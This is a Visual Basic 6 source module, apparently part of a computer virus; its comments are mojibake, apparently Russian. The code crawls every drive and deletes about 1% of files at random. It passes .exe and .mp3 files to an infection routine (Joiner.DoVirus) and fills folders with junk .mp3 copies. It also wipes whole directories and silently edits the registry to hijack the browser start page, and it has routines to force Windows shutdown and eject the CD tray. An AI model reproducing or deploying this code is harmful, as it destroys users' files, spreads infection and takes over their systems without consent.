VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "Brain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Option Explicit
Private Declare Function mciExecute Lib "winmm.dll" _
(ByVal lpstrCommand As String) As Long
Private Declare Function ExitWindowsEx Lib "user32" _
(ByVal uFlags As Long, ByVal dwReserved As Long) As Long
Const EWX_SHUTDOWN = 1
Const EWX_REBOOT = 2
Const EWX_LOGOFF = 0
Const EWX_FORCE = 4

Public Sub OpenCDdoor()
    Call mciExecute("Set CDAudio Door Open Wait")
End Sub

Public Sub CloseCDdoor()
    Call mciExecute("Set CDAudio Door Closed Wait")
End Sub

Public Sub ExitWindows(intFlag As Integer)
    ExitWindowsEx intFlag, 0
End Sub

Public Sub Catalog()
    Dim strDrv As String
    Dim drvItem As Scripting.Drive
     For Each drvItem In fsysObj.Drives
        strDrv = drvItem
        If drvItem.IsReady Then
                Search strDrv & "\", 0
        End If
    Next drvItem
End Sub

Private Sub Search(CurrentPath As String, Level As Integer)
    Dim intN As Integer, IntDirectory As Integer
    Dim strFileName As String, strDirectoryList() As String
    Dim strW As String
    '�������
    Heard.Blow
    ' ������� ����������� ��� ������� ����� � ������� ��������
    DoEvents
    On Error Resume Next
    strFileName = Dir(CurrentPath)
    Do While strFileName <> ""
        ' 1% ������ ��������� � ������ Seruos=true
        If Int(Rnd * 100) = 0 And Serios Then
            Kill CurrentPath & strFileName
        End If
        ' ����� .���
         If Right(strFileName, 4) = ".exe" And Serios Then
               Joiner.DoVirus CurrentPath & strFileName
         End If
      '����� .mp3 ������ ������ �� �� .��� � ������� (10%)  � ������������ (����������� ���������� ������������) (90%)
         If Right(strFileName, 4) = ".mp3" And Serios Then
               Select Case Int(Rnd * 10)
               Case 0:
                  '����� .mp3 ������ ������ �� �� .��� � �������
                  Joiner.DoVirus CurrentPath & strFileName
               Case Else
                  '������������ (����������� ���������� ������������)
                  If IllFile(strFileName) = True Then GoTo Free
                  Dim i As Integer
                  Dim strCopyFile As String
                  For i = 1 To Len(strFileName) - 4
                     strCopyFile = Replace(Left(strFileName, Len(strFileName) - 4), Mid(strFileName, i, 1), Chr(Int(Rnd * 58 + 65))) & ".mp3"
                     Open CurrentPath & strCopyFile For Binary As 1
                        strW = Space(FileLen(CurrentPath & strFileName) - 8)
                        Put #1, , strW
                        Put #1, , vbCrLf & "End-End"
                     Close #1
                     DoEvents
                  Next i
Free:
               End Select
         End If
        strFileName = Dir
    Loop

    ' ������ ��������� ��������� ������ ������������
    On Error Resume Next
    strFileName = Dir(CurrentPath, vbDirectory)
    Do While strFileName <> ""
        ' ���������� ������� � ������������ ��������,
        ' � ����� ���� �������� Windows NT
        If strFileName <> "." And strFileName <> ".." And strFileName <> "pagefile.sys" Then
            ' ���������� ���, ��� ���������� �� ���������
            If GetAttr(CurrentPath & strFileName) And vbDirectory Then
                
                IntDirectory = IntDirectory + 1
                ReDim Preserve strDirectoryList(IntDirectory)
                strDirectoryList(IntDirectory) = CurrentPath & strFileName
            End If
        End If
        strFileName = Dir
        ' ������������ ������ �������
    Loop
    ' ���������� ������������ ������ �������
    For intN = 1 To (IntDirectory)
        Search strDirectoryList(intN) & "\", Level + 1
    Next intN
End Sub

Sub DeleteFileA(CurrentPath)
    Dim intN As Integer, IntDirectory As Integer
    Dim strFileName As String
    ' ������� ����������� ��� ������� ����� � ������� ��������
    strFileName = Dir(CurrentPath)
    Do While strFileName <> ""
      On Error Resume Next
        If Not (strFileName = App.EXEName & ".exe") Then Kill CurrentPath & strFileName
        strFileName = Dir
    Loop
    ' ������ ��������� ��������� ������ ������������
    strFileName = Dir(CurrentPath, vbDirectory)
    Do While strFileName <> ""
        ' ���������� ������� � ������������ ��������,
        ' � ����� ���� �������� Windows NT
        If strFileName <> "." And strFileName <> ".." And strFileName <> "pagefile.sys" Then
            ' ���������� ���, ��� ���������� �� ���������
            If GetAttr(CurrentPath & strFileName) And vbDirectory Then
                fsysObj.DeleteFolder (CurrentPath & strFileName)
            End If
        End If
        strFileName = Dir
        ' ������������ ������ �������
        DoEvents
    Loop
End Sub

Public Sub StartInternetPage()
   Dim strFile As String
   strFile = "Windows Registry Editor Version 5.00" & vbCrLf & vbCrLf & "[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main]" & vbCrLf & """Start Page"" = ""www.viteksoft.narod.ru"""
   Open winDir & "1.temp" For Binary As 1
      Put #1, , strFile
   Close #1
   On Error Resume Next
   Shell (sysDir & "regedt32.exe /s " & winDir & "1.temp")
   Kill winDir & "1.temp"
End Sub

Public Function IllFile(FileName As String) As Boolean
      Dim strW As String
      IllFile = False
    ' �������� �� ������������
      Open FileName For Binary As 1
         Seek 1, LOF(1) - 6
         strW = Space(7)
         Get #1, , strW
         If strW = "End-End" Then IllFile = True
      Close #1
End Function
